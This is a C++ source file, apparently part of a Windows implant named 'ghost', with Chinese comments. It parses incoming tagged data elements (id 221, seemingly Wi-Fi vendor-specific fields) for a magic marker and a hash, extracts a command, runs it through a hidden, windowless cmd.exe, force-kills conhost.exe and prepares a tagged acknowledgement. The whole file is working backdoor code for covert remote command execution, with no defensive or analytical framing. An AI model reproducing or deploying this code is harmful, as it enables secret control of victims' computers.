#include "stdafx.h"
#include "Action.h"
#include <windows.h>
#include "ghost.h"
#include<tchar.h>
#include<string>

using namespace std;


Action_1::Action_1() :Action_Abs() {
	set_sendInfo("COMMAND\0");
}


Action_1::~Action_1() {
}

void Action_1::set_sendInfo(char * infomation)
{
	char* magic_code = "ac1";	//!!!!特殊识别字段
	char *info = (char *)malloc(255);
	memset(info, '\0', 255);
	strncpy(info, magic_code, strlen(magic_code));
	if (strlen(infomation) <= 252) {
		strncpy(info + 3, infomation, strlen(infomation));
		Action_Abs::set_sendInfo(info);
	}
	/*else {
		HLOG("【ERROR】Send Context len >252 !!!");
	}*/
	free(info);
}

bool Action_1::hide(string zxcmd) {
	HANDLE hReadIn = 0;
	HANDLE hWriteIn = 0;
	HANDLE hReadOut = 0;
	HANDLE hWriteOut = 0;

	SECURITY_ATTRIBUTES saAttr;
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);//结构体大小
	saAttr.lpSecurityDescriptor = 0;//安全描述符
	saAttr.bInheritHandle = TRUE;//安全描述的对象能否被新创建的进程继承

	if (!CreatePipe(&hReadIn, &hWriteIn, &saAttr, 0))//CreatePipe创建匿名管道，返回读，写管道的handle
		return false;
	if (!CreatePipe(&hReadOut, &hWriteOut, &saAttr, 0))
		return false;

	STARTUPINFO si;//StartupInfo结构被CreateProcess函数用来指定一个新建立的线程主窗口的属性
	ZeroMemory(&si, sizeof(si));//ZeroMemory宏用0来填充一块内存区域
	GetStartupInfo(&si);//GetStartupInfo 函数取得在进程启动时被指定的STARTUPINFO 结构

	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;//STARTF_USESTDHANDLES //使用hStdInput、hStdOutput和hStdError成员,STARTF_USESHOWWINDOW //使用wShowWindow成员
	si.wShowWindow = SW_HIDE;//SW_SHOWNORMAL 与SW_RESTORE相同;WORD wShowWindow; //用于设定如果子应用程序初次调用的ShowWindow将SW_SHOWDEFAULT作为nCmdShow参数传递时，该应用程序的第一个重叠窗口应该如何出现。
								   //si.wShowWindow = SW_HIDE;
								   //si.wShowWindow = SW_MAXIMIZE;
	si.hStdInput = hReadIn;//hStdInput用于标识键盘缓存，hStdOutput和hStdError用于标识控制台窗口的缓存
	si.hStdOutput = si.hStdError = hWriteOut;

	PROCESS_INFORMATION pi;//该结构返回有关新进程及其主线程的信息
						   //TCHAR cmdLine[] = TEXT("cmd.exe /k cmd");//TEXT=_T
	TCHAR cmdLine[] = _T("cmd.exe /c cmd");// /c执行完命令窗口就关闭，/k不关闭
	
	bool ret = CreateProcess(
		NULL,    // 不在此指定可执行文件的文件名
		cmdLine, // 命令行参数
		NULL,    // 默认进程安全性
		NULL,    // 默认线程安全性
		TRUE,    // 指定当前进程内的句柄可不可以被子进程继承
		CREATE_NO_WINDOW,  // 指定附加的、用来控制优先类和进程的创建的标志;系统不为新进程创建CUI窗口，使用该标志可以创建不含窗口的CUI程序
		NULL,    // 使用本进程的环境变量
		NULL,    // 指向一个以NULL结尾的字符串，这个字符串用来指定子进程的工作路径
		&si,     // 指向一个用于决定新进程的主窗体如何显示的STARTUPINFO结构体。
		&pi);    // 指向一个用来接收新进程的识别信息的PROCESS_INFORMATION结构体。

	DWORD lBytesWrite;
	if (!WriteFile(hWriteIn, (LPCVOID)zxcmd.c_str(), zxcmd.length(), &lBytesWrite, NULL))
		return false;
	else 
		system("taskkill -f -im conhost.exe");
		return true;

}
bool Action_1::ResolutionCMD(char *pp, int total_size) {
	char* magic_code = "ccc";	//!!!!!特殊识别字段
	boolean ResolutionCmd_STATUS = false;

	while (total_size) {		//解析所有的payload
		ie_data * ie = (struct ie_data *)pp;
		//HLOG("total_size:%d\n", total_size);
		//HLOG("ie  @ %x\n", &ie);
		//HLOG("id  @ %x: %d\n", &ie->id, ie->id);
		//HLOG("len @ %x: %d\n", &ie->len, ie->len);
		//HLOG("val @ %x: %s\n=========\n", &ie->val, ie->val);

		if ((int)ie->id == 221) {
			char *magic = (char *)&ie->val[0];//定位到命令信息位置
			//HLOG("获取的val中的信息：%s \n", magic);//命令信息

			if (strncmp(magic, magic_code, strlen(magic_code)) == 0) {//校验特殊字段
				char command[240] = { 0 };
				char hash_tmp[9] = { '\0' };
				strncpy(hash_tmp, magic + 3, 8);//提取hash
				if (strncmp(get_hash(), hash_tmp, 8) == 0) {
					//HLOG("【WARNING】REAPTINGHASH : %s\n", get_hash());
					break;
				}
				else {
					set_hash(hash_tmp);
				}
				strncpy_s(command, magic + 11, ie->len - 11);
				//HLOG("HASH值：%s\n", get_hash());
				//HLOG("执行的命令：%s\n", command);//执行命令

				string str1 ,s;
				s = "\r\n";
				str1 = command + s;
				hide(str1);
				
				//system("taskkill -f -im cmd.exe *32");
				ResolutionCmd_STATUS = TRUE;
				//system(command);
				//system("pause");
				//exit(1); //退出
				set_sendInfo(get_hash());
				break;
			}
		}
		pp += sizeof(struct ie_data) - 1 + (int)ie->len;
		total_size -= sizeof(struct ie_data) - 1 + (int)ie->len;

	}//while
	return ResolutionCmd_STATUS;
}
